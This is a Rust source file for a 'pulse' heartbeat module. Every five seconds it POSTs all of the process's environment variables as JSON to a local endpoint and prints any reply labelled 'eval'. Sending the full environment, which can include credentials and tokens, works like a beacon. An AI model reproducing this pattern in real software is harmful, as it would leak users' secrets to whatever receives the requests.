use minreq::post;
use serde_json::json;
use std::{
    borrow::{Borrow, BorrowMut},
    collections::HashMap,
    env,
};
use tokio::time;

use crate::bus;

const PULSE_INTERVAL: u64 = 5;
const PULSE_URL: &str = "http://localhost:6022/pulse";

pub fn start(bus: &'static bus::Bus) {
    println!("+ starting pulse");
    let mut _bus = &*bus.clone();
    tokio::spawn(async move { send_pulse_async(_bus, PULSE_INTERVAL).await });
}

async fn send_pulse_async(bus: &bus::Bus, interval_seconds: u64) -> std::io::Result<()> {
    let mut interval = time::interval(time::Duration::from_secs(interval_seconds));
    let v = bus.on_signal;
    v("adsf".to_string(),1);

    loop {
        let payload_env: HashMap<String, String> = env::vars().collect();
        let payload = json!(payload_env).to_string();
        let send_request = post(PULSE_URL)
            .with_header("Content-Type", "application/json")
            .with_body(payload)
            .send();

        if send_request.is_err() {
            println!("pulse sent failed - will retry");
        } else {
            let response = send_request.unwrap();

            print!("pulse sent - status:{} ", response.status_code);

            match response.status_code {
                204 => {
                    println!("ok")
                }
                201 => {
                    let data = response.as_str().unwrap();
                    let cid = response.headers["cid"].as_str();
                    println!("with eval: ({}) {}", cid, data);
                }
                _ => {
                    println!("with error: {}", response.reason_phrase);
                }
            }
        }

        interval.tick().await;
    }
}
